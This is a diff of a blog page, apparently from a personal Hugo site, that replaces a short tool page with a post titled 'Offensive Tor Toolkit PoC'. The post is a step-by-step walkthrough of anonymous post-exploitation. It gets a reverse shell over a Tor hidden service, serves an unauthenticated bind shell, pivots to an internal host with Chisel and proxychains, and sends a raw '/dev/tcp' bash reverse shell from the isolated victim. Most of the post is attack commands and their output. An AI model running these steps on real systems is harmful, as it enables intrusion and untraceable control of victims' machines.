@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="reverse-shell-over-tor">
+<meta name="description" content="Offensive Tor Toolkit PoC">
 
-<title>reverse-shell-over-tor | atorrescogollo - Blog &amp; Wikis</title>
+<title>Offensive Tor Toolkit PoC | atorrescogollo - Blog &amp; Wikis</title>
 
 <link rel="icon" href="/geekdoc/favicon/favicon-32x32.png" type="image/x-icon">
 
@@ -171,7 +171,7 @@
             
             
                 <span class="flex">
-                    <a href="/geekdoc/projects/offensive-tor-toolkit/reverse-shell-over-tor/" class="gdoc-nav__entry is-active">
+                    <a href="/geekdoc/projects/offensive-tor-toolkit/reverse-shell-over-tor/" class="gdoc-nav__entry ">
                         reverse-shell-over-tor
                     </a>
                 </span>
@@ -381,60 +381,18 @@
 
             <div class="gdoc-page">
                 
-    
-
-
-    
-
-
-
-
-
-
-<div class="gdoc-page__header flex flex-wrap justify-between hidden-mobile" itemscope itemtype="http://data-vocabulary.org/Breadcrumb">
-    <span>
-        
-        <span class="breadcrumb">
-            <svg class="icon path"><use xlink:href="#path"></use></svg>
-            
-            
-    
-    
-        
-        
-        
-    
-    
-        
-        
-        
-    
-    
-        
-        
-        
-    
-    
-        <a href='/geekdoc/'></a> / <a href='/geekdoc/projects/'>Projects</a> / <a href='/geekdoc/projects/offensive-tor-toolkit/'>Offensive Tor Toolkit</a> / reverse-shell-over-tor
-    
-
-    
-
-    
-
-    
-
-        </span>
-        
-    </span>
-    <span>
-        
-    </span>
-</div>
-
-
-    <article class="gdoc-markdown">
-        <h1>reverse-shell-over-tor</h1>
+    <article class="gdoc-markdown gdoc-post">
+      <header class="gdoc-post__header">
+        <h1 class="gdoc-post__title">Offensive Tor Toolkit PoC</h1>
+        <div class="gdoc-post__date">
+            <svg class="icon date"><use xlink:href="#date"></use></svg>
+            <time datetime="2020-11-18T00:00:00Z">
+                
+                Nov 18, 2020
+            </time>
+        </div>
+      </header>
+      <div>
         
 
 
@@ -442,20 +400,137 @@
     
 
 
-<p>This tool allows the <strong>victim to connect to the Hidden Service</strong> of the attacker. If the attacker starts a netcat handler, it will give him a <strong>shell session</strong>.</p>
-<p>Some parameters need to be set:</p>
-<pre><code>$ ./reverse-shell-over-tor -h
-Usage of reverse-shell-over-tor:
+<p>In this post we will be showing how to use <a href="https://github.com/atorrescogollo/offensive-tor-toolkit"><strong>Offensive Tor Toolkit</strong></a> for pentesting over Tor. This suite of tools will allow us to execute exploitation and post-exploitation tasks from the victim preserving the attacker anonymity. For more info, check the <a href="../../projects/offensive-tor-toolkit"><strong>docs</strong></a>.</p>
+<p>First of all, we have the following vulnerable scenario:</p>
+<ul>
+<li><strong>Victim1</strong> serves a vulnerable service to Internet.</li>
+<li><strong>Victim2</strong> serves a vulnerable service to the internal network and it has no access to Internet.</li>
+</ul>
+<p><span class="img-medium"><img src="../static/offensive-tor-toolkit/01_Overview.png" alt="Overview"></span></p>
+</br>
+<div class="gdoc-page__anchorwrap"><h2 id="gaining-access-with-reverse-shell-over-tor">Gaining access with reverse-shell-over-tor<a data-clipboard-text="/geekdoc/posts/offensive-tor-toolkit/" class="gdoc-page__anchor gdoc-page__anchor--right clip" aria-label="Anchor Gaining access with reverse-shell-over-tor" href="#gaining-access-with-reverse-shell-over-tor"><svg class="icon link"><use xlink:href="#link"></use></svg></a></h2></div>
+<p>We assume that <strong>we are able to execute commands in Victim1</strong> in some way. Then, to obtain a reverse shell preserving anonymity, we will use <a href="../../projects/offensive-tor-toolkit/reverse-shell-over-tor"><strong>reverse-shell-over-tor</strong></a> from <a href="https://github.com/atorrescogollo/offensive-tor-toolkit"><strong>Offensive Tor Toolkit</strong></a> as follows:</p>
+<ul>
+<li><strong>Attacker</strong>: run the handler reachable from a Hidden Service.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ grep <span class="s1">&#39;^HiddenService&#39;</span> /etc/tor/torrc
+HiddenServiceDir /tmp/tortest
+HiddenServicePort <span class="m">4444</span> 127.0.0.1:4444
 
-  -listener string
-        Listener address. Format: &lt;ONION_ADDR&gt;:&lt;PORT&gt;
-  -reverse-shell-program string
-        Program to execute on reverse-shell (default &quot;/bin/sh&quot;)
-  -timeout int
-        Timeout in seconds for Tor setup (default 180)
-</code></pre><p>See <a href="../../../posts/offensive-tor-toolkit/#gaining-access-with-reverse-shell-over-tor"><strong>Gaining access with reverse-shell-over-tor</strong></a> for a real usage example.</p>
+<span class="o">[</span>attacker<span class="o">]</span>$ cat /tmp/tortest/hostname
+m5et..jyd.onion
+
+<span class="o">[</span>attacker<span class="o">]</span>$ nc -lvnp <span class="m">4444</span>
+</code></pre></div><ul>
+<li><strong>Victim1</strong>: download and execute <a href="../../projects/offensive-tor-toolkit/reverse-shell-over-tor"><strong>reverse-shell-over-tor</strong></a>.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>victim1<span class="o">]</span>$ ./reverse-shell-over-tor <span class="se">\
+</span><span class="se"></span>    -listener m5et..jyd.onion:4444
+</code></pre></div><ul>
+<li><strong>Attacker</strong>: reverse shell is catched with the handler.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ nc -lvnp <span class="m">1234</span>
+...
+id
+<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+</code></pre></div><p><span class="img-medium"><img src="../static/offensive-tor-toolkit/02_reverse-shell-over-tor.png" alt="Reverse Shell over Tor"></span></p>
+</br>
+<div class="gdoc-page__anchorwrap"><h2 id="multi-shell-access-with-bind-shell">Multi-shell access with bind shell<a data-clipboard-text="/geekdoc/posts/offensive-tor-toolkit/" class="gdoc-page__anchor gdoc-page__anchor--right clip" aria-label="Anchor Multi-shell access with bind shell" href="#multi-shell-access-with-bind-shell"><svg class="icon link"><use xlink:href="#link"></use></svg></a></h2></div>
+<p>In order to get a bind shell served by <strong>Victim1</strong>, we will use <a href="../../projects/offensive-tor-toolkit/hidden-bind-shell"><strong>hidden-bind-shell</strong></a> as follows:</p>
+<ul>
+<li><strong>Victim1</strong>: download and execute <a href="../../projects/offensive-tor-toolkit/hidden-bind-shell"><strong>hidden-bind-shell</strong></a>.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>victim1<span class="o">]</span>$ ./hidden-bind-shell <span class="se">\
+</span><span class="se"></span>    -data-dir /tmp/datadir/ <span class="se">\
+</span><span class="se"></span>    -hiddensrvport <span class="m">1234</span>
+...
+Bind shell is listening on hgnzi6j3rqog6yew.onion:1234
+</code></pre></div><ul>
+<li><strong>Attacker</strong>: connect to the Hidden Service to get a shell session.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ <span class="nb">alias</span> <span class="nv">nctor</span><span class="o">=</span><span class="s1">&#39;nc --proxy 127.0.0.1:9050 --proxy-type socks5&#39;</span>
+<span class="o">[</span>attacker<span class="o">]</span>$ nctor -v hgnzi6j3rqog6yew.onion <span class="m">1234</span>
+...
+id
+<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+</code></pre></div><blockquote>
+<p>It should be noted that <code>data-dir</code> flag will allow us to start the service always in the same onion address.</p>
+</blockquote>
+<blockquote>
+<p>Currently, this bind shell has no authentication. This means that this bind shell for persistent purposes can be dangerous.</p>
+</blockquote>
+<p><span class="img-medium"><img src="../static/offensive-tor-toolkit/03_hidden-bind-shell.png" alt="Hidden Bind Shell"></span></p>
+</br>
+<div class="gdoc-page__anchorwrap"><h2 id="pivoting-with-hidden-portforwarding-and-chisel">Pivoting with hidden-portforwarding and Chisel<a data-clipboard-text="/geekdoc/posts/offensive-tor-toolkit/" class="gdoc-page__anchor gdoc-page__anchor--right clip" aria-label="Anchor Pivoting with hidden-portforwarding and Chisel" href="#pivoting-with-hidden-portforwarding-and-chisel"><svg class="icon link"><use xlink:href="#link"></use></svg></a></h2></div>
+<p>At this point, <strong>Victim1</strong> is already compromised. In order to reach <strong>Victim2 (the isolated network machine)</strong>, we will use <strong>Victim1</strong>.
+To achieve our goal, we will use <a href="../../projects/offensive-tor-toolkit/hidden-portforwarding"><strong>hidden-portforwarding</strong></a> together with <a href="https://github.com/jpillora/chisel"><strong>Chisel</strong></a>.</p>
+<p>With this approach, we will set up a <strong>Hidden Service in Victim1 that redirects to the Chisel server</strong>. Thus, from the attacker we can generate a tunnel with the Chisel client on which to send traffic.</p>
+<blockquote>
+<p>Chisel client allows the attacker to generate a tunnel to the Chisel server.</p>
+</blockquote>
+<ul>
+<li><strong>Victim1</strong>: Run the Chisel Server to listen on <code>127.0.0.1:1111</code> and <a href="../../projects/offensive-tor-toolkit/hidden-portforwarding"><strong>hidden-portforwarding</strong></a>.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>victim1<span class="o">]</span>$ ./chisel server -p <span class="m">1111</span> --socks5 <span class="p">&amp;</span>
+<span class="o">[</span>victim1<span class="o">]</span>$ ./hidden-portforwarding <span class="se">\
+</span><span class="se"></span>    -data-dir /tmp/pf-datadir <span class="se">\
+</span><span class="se"></span>    -forward 127.0.0.1:1111 <span class="se">\
+</span><span class="se"></span>    -hidden-port <span class="m">9001</span>
+...
+Forwarding xa7ljkruk7lra4el.onion:9001 -&gt; 127.0.0.1:1111
+</code></pre></div><ul>
+<li><strong>Attacker</strong>: Connect Chisel client to the Chisel server through the Hidden Service.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ <span class="nb">alias</span> chisel-client-tor<span class="o">=</span><span class="s1">&#39;chisel client --proxy socks://127.0.0.1:9050&#39;</span>
+<span class="o">[</span>attacker<span class="o">]</span>$ chisel-client-tor xa7ljkruk7lra4el.onion:9001 socks <span class="p">&amp;</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ ss -lntp <span class="p">|</span> grep chisel
+LISTEN <span class="m">0</span>   <span class="m">4096</span>   127.0.0.1:1080   0.0.0.0:*  users:<span class="o">((</span><span class="s2">&#34;chisel&#34;</span>,pid<span class="o">=</span>3730,fd<span class="o">=</span>3<span class="o">))</span>
+</code></pre></div><p>Now, Chisel client is listening as a <strong>SOCKS5 proxy</strong> so that traffic sent through the proxy goes out through <strong>Victim1</strong>. All you need to reach <strong>Victim2</strong> is to connect to this proxy as follows:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ <span class="nb">alias</span> <span class="nv">pc4</span><span class="o">=</span><span class="s1">&#39;proxychains4 -f /etc/proxychains4.conf&#39;</span>
+<span class="o">[</span>attacker<span class="o">]</span>$ cat /etc/proxychains4.conf
+...
+<span class="o">[</span>ProxyList<span class="o">]</span>
+socks5  127.0.0.1 <span class="m">1080</span>
+
+<span class="o">[</span>attacker<span class="o">]</span>$ pc4 nmap -sT -Pn -n -sV -sC -p80,22,25,3000 victim2
+...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+25/tcp   open  smtp    Postfix smtpd
+80/tcp   open  http    Apache httpd 2.4.43 <span class="o">(()</span> PHP/5.4.16<span class="o">)</span>
+3000/tcp open  http    Mongoose httpd
+...
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 230.37 seconds
+</code></pre></div><p><span class="img-medium"><img src="../static/offensive-tor-toolkit/04_hidden-portforwarding.png" alt="Hidden Portforwarding"></span></p>
+<div class="gdoc-page__anchorwrap"><h2 id="remote-port-forwarding-through-tor">Remote port forwarding through Tor<a data-clipboard-text="/geekdoc/posts/offensive-tor-toolkit/" class="gdoc-page__anchor gdoc-page__anchor--right clip" aria-label="Anchor Remote port forwarding through Tor" href="#remote-port-forwarding-through-tor"><svg class="icon link"><use xlink:href="#link"></use></svg></a></h2></div>
+<p><strong>Victim2</strong> does not have Internet access, so we cannot access Tor directly from it. Alternatively, we can use <a href="../../projects/offensive-tor-toolkit/tcp2tor-proxy"><strong>tcp2tor-proxy</strong></a> to have <strong>Victim1</strong> used as a Tor proxy for <strong>Victim2</strong>.</p>
+<ul>
+<li><strong>Victim1</strong>: Set up the remote port forwarding so that <code>127.0.0.1:60101</code> will reach the Hidden Service.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>victim1<span class="o">]</span>$ ./tcp2tor-proxy -listen 0.0.0.0:60101 -onion-forward m5et..jyd.onion:4444
+...
+Proxying 0.0.0.0:60101 -&gt; m5et..jyd.onion:4444
+</code></pre></div><ul>
+<li><strong>Attacker</strong>: Set up a handler to received reverse shells.</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ nc -lnvp <span class="m">1234</span>
+</code></pre></div><ul>
+<li><strong>Victim2</strong>: Send the reverse shell to <strong>Victim1</strong> (tcp2tor-proxy).</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>victim2<span class="o">]</span>$ bash -i &gt;<span class="p">&amp;</span> /dev/tcp/victim1/60101 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div><ul>
+<li><strong>Attacker</strong>: Receive the reverse shell</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>attacker<span class="o">]</span>$ nc -lnvp <span class="m">1234</span>
+...
+id
+<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+</code></pre></div><p><span class="img-medium"><img src="../static/offensive-tor-toolkit/05_tcp2tor-proxy.png" alt="Tcp2Tor Proxy"></span></p>
 
 
+      </div>
     </article>
 
                 
